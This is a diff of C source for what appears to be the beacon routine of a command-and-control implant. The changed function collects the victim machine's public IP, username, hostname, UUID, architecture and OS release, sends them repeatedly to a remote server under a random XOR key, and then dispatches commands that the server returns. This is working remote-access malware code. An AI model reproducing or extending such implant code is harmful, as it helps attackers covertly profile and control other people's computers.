@@ -48,11 +48,18 @@ bool net_client(char *host, int port){
   server.sin_port        = htons(port);
 
   net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_client_beacon_t));
-  
   net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));
-  p_net_client_beacon->xor_key = DEFS_XOR_KEY;
-  p_net_client_beacon->sysinfo = *sys_info();
 
+  sys_info_t sysinfo;
+
+  sys_public_ip(sysinfo.ip);
+  sys_username(sysinfo.username, SYS_USERNAME_SIZE);
+  sys_arch(sysinfo.arch, SYS_ARCH_SIZE);
+  sys_get_uuid(sysinfo.uuid);
+  sys_hostname(sysinfo.hostname, SYS_HOSTNAME_SIZE);
+  sys_release(sysinfo.release, SYS_RELEASE_SIZE);
+  sysinfo.cpu_usage = sys_load_average();
+  
   while(true){
     sock_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (sock_fd < 0){
@@ -72,6 +79,9 @@ bool net_client(char *host, int port){
     }
 
     while(true){
+      p_net_client_beacon->xor_key = crypt_random_xor_key();
+      p_net_client_beacon->sysinfo = sysinfo;
+      p_net_client_beacon->sysinfo.cpu_usage = sys_load_average();
       p_net_client_beacon->sysinfo.cpu_usage = sys_load_average();
       if (send(sock_fd, p_net_client_beacon, sizeof(net_client_beacon_t), 0) < 0){
         fprintf(stderr,
@@ -82,14 +92,11 @@ bool net_client(char *host, int port){
       }
       if (recv(sock_fd, p_net_server_beacon, sizeof(net_server_beacon_t), 0) <= 0){
         fprintf(stderr,
-                "[-] failed to received data from %s:%d\n",
+                "[-] failed to receive data from %s:%d\n",
                 inet_ntoa(server.sin_addr),
                 ntohs(server.sin_port));
         break;
       } else{
-        /* crypt_decrypt_xor((void *)p_net_server_beacon, */
-        /*                   sizeof(net_server_beacon_t), */
-        /*                   DEFS_XOR_KEY); */
         if (p_net_server_beacon->status == true){
           switch(p_net_server_beacon->command){
           case NET_SERVER_CMD_BEACON:
